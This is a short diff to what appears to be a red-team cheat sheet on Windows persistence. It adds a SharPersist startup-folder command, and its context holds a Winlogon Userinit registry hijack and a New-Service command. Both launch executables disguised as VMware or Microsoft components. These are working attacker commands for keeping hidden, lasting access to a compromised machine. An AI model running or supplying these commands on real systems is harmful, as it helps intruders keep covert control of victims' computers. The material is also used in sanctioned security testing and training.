@@ -37,7 +37,12 @@ reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"
 
 ```
+### Startup Folder
+```
+SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c meme.exe" -f "Some File" -m add
+```
 ### Services Persistence
+
 ```
 New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"
 
